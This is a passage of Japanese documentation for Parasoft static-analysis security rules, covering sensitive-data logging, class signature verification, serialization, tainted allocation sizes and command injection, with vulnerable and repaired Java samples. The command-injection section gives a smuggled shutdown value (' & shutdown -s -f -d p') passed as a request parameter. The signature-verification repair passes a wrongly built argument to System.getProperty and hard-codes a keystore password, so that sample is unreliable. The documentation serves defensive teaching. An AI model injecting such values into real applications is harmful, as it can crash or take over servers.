[ログ記録メソッド] パラメーターは、ファイルにログを記録するメソッドを定義します。
リストされたメソッドのいずれかへのパラメーターとして機密データが渡されている
場合に違反がレポートされます。

その他の関数を設定するには、以下の列に値を入力します。
- [有効]  ログ記録メソッドを有効または無効にします。無効化すると、ルールは関数をログ記録メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の
  完全修飾名を指定する必要があります。
  任意の型で宣言されたメソッド指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
  に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
  非インスタンス メソッドの両方に適用されることに注意してください。

- [記録されるパラメーター] 機密データが渡されているかをチェックするパラメーターの番号を指定します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
該当する場合は '*' を指定します。

デフォルトでは、以下のメソッドのパラメーターがチェックされます。

- "*[Ll]og*" 型の "*Log*" メソッド
- "*[Ll]og*" 型の "*log*" メソッド
- "*[Ll]og*" 型の "*[Ii]nfo*" メソッド
- "*[Ll]og*" 型の "*[Ww]arn*" メソッド
- "*[Ll]og*" 型の "*[Ee]rror*" メソッド

[機密上重要な変数] パラメーターを使用すると、機密上重要とみなす変数を指定できます。
変数を設定するには、以下の列に値を入力します。

- [有効]  機密上重要な変数を有効または無効にします。無効化すると、ルールは変数を機密上重要として扱いません。

- [完全修飾型名または名前空間 (ワイルドカード)] 列には変数を宣言する型の
  完全修飾名を指定する必要があります。
  任意の型で宣言された変数を指定するには '*' を使用します。
デフォルトでは、次の変数が機密上重要とみなされます。
- '*[Pp]assword*'
- '*[Pp]asswd*'
 
[機密上重要なメソッド] パラメーターを使用すると、機密上重要とみなすメソッドを指定できます。

- [有効]  機密上重要なメソッドを有効または無効にします。無効化すると、ルールはメソッドを機密上重要として扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の
  完全修飾名を指定する必要があります。
  任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
  に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
  非インスタンス メソッドの両方に適用されることに注意してください。

- ['this' オブジェクトが機密データを持つ] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを機密上重要にすることを表します。

- [機密データを返す] 列を有効に設定した場合、メソッドは戻り値を機密データにします。

- [機密上重要なパラメーター] 列に値を設定した場合、メソッドはパラメーターを機密データにします。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。
デフォルトでは、次のメソッドが機密上重要とみなされます。
- '*[Pp]assword*'


</PRE>
<STRONG>
利点
</STRONG>
<PRE>

潜在的な攻撃者に機密データを公開するのを防ぐのに役立ちます。




</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、機密データが 'info'メソッドに渡され、メソッドがデータをファイルに
書き込んでいます。

import java.io.IOException;
import java.util.logging.Logger;

public abstract class Example
{
    private Logger logger;

    public abstract String getPassword();

    public void test01()
        throws IOException
    {
        String password = getPassword();
        logger.info(password); //  違反
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>

データをファイルに書き込む前に、安全なデータ処理メソッド 'secure'で
パスワードを安全化します。

import java.io.IOException;
import java.util.logging.Logger;

public abstract class Repair
{
    private Logger logger;

    public abstract String getPassword();

    public abstract String secure(String sTxt);

    public void test01()
        throws IOException
    {
        String password = getPassword();
        logger.info(secure(password)); // 違反ではない
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>
2020 CWE Top 25 Most Dangerous Software Errors
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/200.html">https://cwe.mitre.org/data/definitions/200.html</A>

2020 CWE Weaknesses On the Cusp
CWE-532: Insertion of Sensitive Information into Log File
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/532.html">https://cwe.mitre.org/data/definitions/532.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.SIGCLASS" href="#top">[Top]</a><br/><br/><STRONG>
URLClassLoader および java.util.jar が提供するデフォルトの自動シグニチャ検証に依存しない [BD.SECURITY.SIGCLASS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、追加のクラス証明書の検証を行わずにロードされたクラスから取得したオブジェクトで、
リフレクション メカニズムを使用してメソッドを呼び出しているか、クラスの新しいインスタンスを
作成している場合に違反をレポートします。追加の検証とは以下を指します。
- ロード対象クラスの CodeSource から証明書チェーンを取得することによってプログラム的に署名をチェックする
- これらの証明書のいずれかが、証明書があらかじめ安全に取得され、ローカル キー ストアに格納された信頼済み署名者の
  ものかどうかをチェックする
		
ロードされたクラスを返すメソッドのリスト
    java.lang.ClassLoader (およびそのサブクラス)のメソッド:
        * loadClass(String name);
        * loadClass(String name, boolean resolve);
        * findLoadedClass(String name);
        * findClass(String name);
        * findSystemClass(String name);
    javax.management.loading.MLet のメソッド:
        * loadClass(String name, ClassLoaderRepository clr);
	
メソッドまたはコンストラクター オブジェクトを返すメソッドのリスト
    java.lang.Class のメソッド:
        * getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes);
        * getDeclaredMethods();
        * getEnclosingMethod();
        * getMethod(String name, Class&lt;?&gt;... parameterTypes);
        * getMethods();
        * getConstructor(Class&lt;?&gt;... parameterTypes);
        * getConstructors();
        * getDeclaredConstructor(Class&lt;?&gt;... parameterTypes);
        * getDeclaredConstructors();
        * getEnclosingConstructor();

コード実行を担うメソッドのリスト
    java.lang.reflect.Method のメソッド:
        * invoke(Object obj, Object... args);	
    java.lang.reflect.Constructor のメソッド:
        * newInstance(Object... initargs)

	

</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.3.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
デフォルトの自動署名検証プロセスは、適切ではありません。適正な JAR ファイルが、別の公開鍵と
変更されたダイジェスト値を含む悪意のある JAR ファイルに置き換えられる可能性があります。
これは、ロードされたクラス オブジェクトに対してクラス証明書の検証を追加することで防止できます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
このルールは、攻撃者が適正なソースを悪意のあるソフトウェアに置き換えるのを防ぎます。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class Example
    extends URLClassLoader
{
    public Example(URL[] urls)
    {
        super(urls);
    }

    public void invokeClass(String name, String[] args)
        throws Exception
    {
        Class c = loadClass(name);
        Method m = c.getMethod("main", new Class[] { args.getClass()});
        m.setAccessible(true);
        try {
            m.invoke(null, new Object[] { args}); // 違反
        } catch (IllegalAccessException e) {
            System.out.println("Access denied");
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
クラス証明書の検証を追加して上記のサンプルを修正します。

import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.KeyStore;
import java.security.cert.Certificate;

public class Repair
    extends URLClassLoader
{
    public Repair(URL[] urls)
    {
        super(urls);
    }

    public void invokeClass(String name, String[] args)
        throws Exception
    {
        Class c = loadClass(name);
        Method m = c.getMethod("main", new Class[] { args.getClass()});
        m.setAccessible(true);
        Certificate[] certs = c.getProtectionDomain().getCodeSource().getCertificates();
        if (certs == null) {
            // Return, do not execute if unsigned
            System.out.println("No signature!");
            return;
        }
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(new FileInputStream(System.getProperty("user.home" + File.separator + "keystore.jks")), "loadkeystorepassword".toCharArray());
        // ユーザーはエイリアス
        Certificate pubCert = ks.getCertificate("user");
        // 信頼された公開鍵でチェック、他の場合は例外をスロー
        certs[0].verify(pubCert.getPublicKey()); // 追加の検証 
        try {
            m.invoke(null, new Object[] { args}); // 違反ではない
        } catch (IllegalAccessException e) {
            System.out.println("Access denied");
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
SEC06-J. Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/SEC06-J.+Do+not+rely+on+the+default+automatic+signature+verification+provided+by+URLClassLoader+and+java.util.jar">https://www.securecoding.cert.org/confluence/display/java/SEC06-J.+Do+not+rely+on+the+default+automatic+signature+verification+provided+by+URLClassLoader+and+java.util.jar</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.SSSD" href="#top">[Top]</a><br/><br/><STRONG>
機密データを安全にシリアライズする [BD.SECURITY.SSSD]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、機密性の高いオブジェクトに署名をしてシールする前にシリアライズしている場合に違反を
レポートします。オブジェクトをシーリングすると、シリアライズされたデータが暗号化され
ます。署名を行うと、オブジェクトの完全性を保証するデジタル署名がオブジェクトに適用されます。

ルールは、java.io.ObjectOutputStream に書き込まれるデータが、java.security.SignedObject および
javax.crypto.SealedObject を使用して署名されているかをチェックします。

機密データのソース:

   * toString(): toString() は、オブジェクトの内部的な情報を表示するよう実装されている場合が多くあります。

   * リフレクション: リフレクションを使用すると、実行時にプログラムの内部構造を確認し、変更できます。
     そのため、リフレクション メカニズムは機密上注意を要するとみなされます。
      * java.lang.Class
      * java.reflect.AccessibleObject
      * java.lang.reflect.Field
      * java.lang.reflect.Method
      * java.lang.reflect.Constructor

   * 例外: すべての java.lang.Throwable インスタンスは機密情報です。

   * 環境変数およびシステム プロパティ
   
その他の機密データのソースを指定できます。「パラメーター」セクションを参照してください。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.3


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #3 「A3 - 機微な情報の露出」を推進します。

暗号化されていないオブジェクトをシリアライズすると、機密の可能性がある情報を攻撃者が横取りし、
アプリケーションに対して未認証のアクセスを行うことが可能になる場合があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[Object.toString() メソッドを機密情報とみなす] パラメーターを使用すると、"Object.toString()"
メソッドの扱いを指定できます。有効化した場合、Object.toString() が機密データを返すとみなされます。
デフォルトの設定は true です。

[環境変数およびシステム プロパティを機密情報とみなす] パラメーターを使用すると、
環境変数およびシステム プロパティを返すメソッド ("System.getProperty(String key)" など) 
の扱いを指定できます。有効化した場合、これらのメソッドが機密データを返すとみなされます。
デフォルトの設定は true です。

[機密上重要とみなす追加のメソッド] パラメーターを使用すると、その他の機密性の高い
メソッドを指定できます。
デフォルトでは、このパラメーターは空です。メソッドを設定し、影響を受けるデータを
指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを重要なメソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- ['this' オブジェクトが機密データを持つ] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  機密データにすることを表します。

ｰ [機密データを返す] 列を有効に設定した場合、メソッドは戻り値を機密データにします。

- [機密上重要なパラメーター] 列に値を設定した場合、メソッドはパラメーターを機密データにします。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。


[機密上重要とみなす型] パラメーターを使用すると、機密性が高いとみなす型を指定できます。
デフォルトでは、「説明」セクションで挙げられた型が指定されています。
 

</PRE>
<STRONG>
利点
</STRONG>
<PRE>
機密である可能性がある情報が安全にシリアライズされるようにします。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class Example
{
    public void doSerialize(Exception e, File f)
        throws IOException
    {
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(new FileOutputStream(f));
            out.writeObject(e); // 違反
        } finally {
            out.close();
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.security.GeneralSecurityException;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.SignedObject;

import javax.crypto.Cipher;
import javax.crypto.SealedObject;

public class Repair
{
    public void doSerialize(Exception e, File f, Cipher c, PrivateKey key, Signature signature)
        throws IOException, GeneralSecurityException
    {
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(new FileOutputStream(f));
            SignedObject signed = new SignedObject(e, key, signature);
            SealedObject sealed = new SealedObject(signed, c);
            out.writeObject(sealed); // 違反ではない
        } finally {
            out.close();
        }
    }
}

教育とトレーニング

Serialization
Video: <A target="_blank" HREF="https://vimeo.com/205101080">https://vimeo.com/205101080</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_5-Serialization.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_5-Serialization.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/fdaf0115-6c8c-410d-97c3-00965dbf3b92">https://app.hackedu.com/link/fdaf0115-6c8c-410d-97c3-00965dbf3b92</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A3-Sensitive Data Exposure):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-502: Deserialization of Untrusted Data
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/502.html">https://cwe.mitre.org/data/definitions/502.html</A>

SEI CERT Oracle Coding Standard for Java
SER02-J. Sign then seal sensitive objects before sending them outside a trust boundary
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/SER02-J.+Sign+then+seal+objects+before+sending+them+outside+a+trust+boundary">https://www.securecoding.cert.org/confluence/display/java/SER02-J.+Sign+then+seal+objects+before+sending+them+outside+a+trust+boundary</A>

Tags: OWASP, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDALLOC" href="#top">[Top]</a><br/><br/><STRONG>
メモリ割り当サイズの決定に使用する前に、汚染されている可能性があるデータを検証する [BD.SECURITY.TDALLOC]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、汚染されている可能性があるデータを使ってメモリ割り当てサイズを
決定している場合に違反をレポートします。

次の場合に違反がレポートされます。
- 汚染されている可能性があるデータを検証せずに配列サイズの決定に使用している。
- 汚染されている可能性があるデータを検証せずに以下のメソッドにコンテナーの初期
  サイズを指定するコンストラクター パラメーターとして渡している。
    * java.util.ArrayDeque
    * java.util.ArrayList
    * java.util.HashMap
    * java.util.HashSet
    * java.util.Hashtable
    * java.util.IdentityHashMap
    * java.util.LinkedHashMap
    * java.util.LinkedHashSet
    * java.util.PriorityQueue
    * java.util.Vector
    * java.util.WeakHashMap

    * java.util.concurrent.ArrayBlockingQueue
    * java.util.concurrent.ConcurrentHashMap
    * java.util.concurrent.LinkedBlockingDeque
    * java.util.concurrent.LinkedBlockingQueue
    * java.util.concurrent.PriorityBlockingQueue

    * javax.management.AttributeList
    * javax.management.relation.RoleList
    * javax.management.relation.RoleUnresolvedList

    * javax.management.openmbean.TabularDataSupport

    * javax.print.attribute.standard.JobStateReasons
    * javax.print.attribute.standard.PrinterStateReasons

    * javax.swing.UIDefaults

ルールをパラメータライズして汚染されている可能性があるデータのソースと
データを検証するメソッドを指定する必要があります。(「パラメーター」セクション
を参照)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

2020.1



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

「リソースを無制限に割り当てていると、攻撃者が他のシステム、アプリケーション、
プロセスなどが同じタイプのリソースにアクセスするのを妨げる可能性があります。」
[CWE-770]

「メモリの割り当てを制御していないと、過大なシステム メモリが要求され、メモリ
不足によるアプリケーションのクラッシュや、大きなシステム メモリが消費される
などの問題につながる可能性があります。」
[CWE-789]
 
 

</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * データベース
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。




</PRE>
<STRONG>
利点
</STRONG>
<PRE>

安全なメモリ割り当てを保証し、過剰なメモリの消費やセキュリティ攻撃を防ぐのに
役立ちます (「セキュリティとの関連」を参照)。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、汚染されている可能性があるデータを使用して配列のサイズを
決定しています。

import javax.servlet.http.HttpServletRequest;

public class Example
{
    void example(HttpServletRequest request)
    {
        String sizeString = request.getParameter("size");
        int size = Integer.valueOf(sizeString);
        int[] array = new int[size]; // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

検証メソッドを使用して汚染されている可能性があるデータを検証します。

import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{    
    void example(HttpServletRequest request)
    {
        String sizeString = request.getParameter("size");
        int size = Integer.valueOf(sizeString);
        int validatedSize = validate(size);
        int[] array = new int[validatedSize]; // 違反ではない
    }
    
    abstract int validate(int size);
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API4-Lack of Resources &amp; Rate Limiting
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa4-lack-of-resources-and-rate-limiting.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa4-lack-of-resources-and-rate-limiting.md</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-400: Uncontrolled Resource Consumption
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/400.html">https://cwe.mitre.org/data/definitions/400.html</A>

2020 CWE Weaknesses On the Cusp
CWE-770: Allocation of Resources Without Limits or Throttling
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/770.html">https://cwe.mitre.org/data/definitions/770.html</A>

CWE-789: Uncontrolled Memory Allocation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/789.html">https://cwe.mitre.org/data/definitions/789.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDCMD" href="#top">[Top]</a><br/><br/><STRONG>
コマンド インジェクションから防御する [BD.SECURITY.TDCMD]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、
エンド ユーザーからのデータが実行されるコードに影響するケースを
検出します。
たとえば、実行するファイル名をユーザー データから生成しているケースなどです。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

java.lang.Runtime
   * exec(String)
   * exec(String, String[])
   * exec(String, String[], File)
   * exec(String[])
   * exec(String[], String[])
   * exec(String[], String[], File)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃


OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」を推進します。

汚染されたデータが、実行されるファイル名に使用される場合、
悪意のあるプログラマによる不正なコードが実行されて
システムが損害を受ける可能性があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * データベース
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
ある Web アプリケーションがあり、このアプリケーションは
リクエストから受け取ったユーザー定義パラメーターを使って
何らかの処理を開始するものとします。
この場合、未検証のユーザー データを実行リクエストに渡すと、
危険な状況につながる恐れがあります。
たとえば、不正なユーザーがアプリケーション権限を使って
サーバーでカスタム コードを実行できます。

たとえば、リクエストの command_parameter 値として
" &amp; shutdown -s -f -d p" を渡すと、
次のようにコマンドが実行されたときにサーバーはシャットダウンします。


import javax.servlet.http.HttpServletRequest;

public class Example
{
    void systemInjection(HttpServletRequest req)
        throws Exception
    {
        String sCommand = "call process_data.exe -params " + req.getParameter("command_parameters");
        Runtime.getRuntime().exec(sCommand); // 違反
    }
}




</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。


import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    void systemInjection(HttpServletRequest req)
        throws Exception
    {
        String sCommand = "call process_data.exe -params " + validate(req.getParameter("command_parameters"));
        Runtime.getRuntime().exec(sCommand); // 違反ではない
    }

    public abstract String validate(Object obj);
}


教育とトレーニング

Command Injections
Video: <A target="_blank" HREF="https://vimeo.com/281198991">https://vimeo.com/281198991</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/baa416fb-d65b-45d6-b514-60de505f3cc2">https://app.hackedu.com/link/baa416fb-d65b-45d6-b514-60de505f3cc2</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</A>

2020 CWE Weaknesses On the Cusp
CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/77.html">https://cwe.mitre.org/data/definitions/77.html</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/os_commanding.shtml">http://www.webappsec.org/projects/threat/classes/os_commanding.shtml</A>

Cigital Java Security Rulepack # 58:
<A target="_blank" HREF="http://www.cigital.com/securitypack/view/index.html">http://www.cigital.com/securitypack/view/index.html</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81
Reviewing Code for OS Injection p. 112
Reviewing Code for Cross-site scripting p. 141

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDCODE" href="#top">[Top]</a><br/><br/><STRONG>
コードを生成するメソッドで使用する前に、汚染されている可能性があるデータを検証する [BD.SECURITY.TDCODE]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、汚染されている可能性があるデータを動的評価の呼び出しまたは
コード セグメントを構築するメソッドで使用している場合に違反をレポートします。

汚染されたデータが以下のいずれかのメソッドに渡されている場合に違反をレポートします。

